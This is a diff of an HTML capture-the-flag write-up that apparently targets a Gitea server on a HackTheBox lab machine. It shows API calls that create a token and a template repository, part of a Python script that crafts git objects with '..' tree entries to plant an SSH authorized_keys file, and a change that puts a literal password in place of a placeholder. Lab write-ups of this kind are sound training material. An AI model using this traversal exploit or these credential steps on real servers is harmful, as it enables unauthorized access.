@@ -313,7 +313,7 @@ if __name__ == '__main__':
 
 curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
   -H "Content-Type: application/json" \
-  -u "<username>:<password>" \
+  -u "jones:y27xb3ha!!74GbR" \
   -d '{"name":"newtoken","scopes":["write:user","write:repository"]}'
 </code></pre>
 <img src="https://i.imgur.com/W7wqpAR.png" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
@@ -325,18 +325,14 @@ curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
   -H "Content-Type: application/json" \
   -d '{"name":"rce","private":false}'
 
-{"id": 2, "name": "rce", "full_name": "jones/rce", ...}
-
-# Mark as template
 curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
   -H "Authorization: token $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"template":true}'
-
-{"template": true, ...}
 </code></pre>
 
 <p>Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
+
 <pre><code>#!/usr/bin/env python3  
 import hashlib,zlib,os,subprocess,sys,time  
   
@@ -377,7 +373,8 @@ os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
 open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")  
 print("Done: "+sha)</code></pre>
 </p>Initializing the local repo and setting the remote before crafting the objects</p>
-<img src="images/nexus/15-malicious-repo-init.jpg" alt="Initializing the local repo and setting the remote before crafting the objects" />
+<img src="https://i.imgur.com/yhcw5bR.png" alt="Initializing the local repo and setting the remote before crafting the objects" />
+<img src="https://i.imgur.com/Wtlta8c.png" alt="setting the remote before crafting the objects" />
 
 <p>Then run <code>git push origin main</code>.</p>
 <pre><code>git push origin main</code></pre>
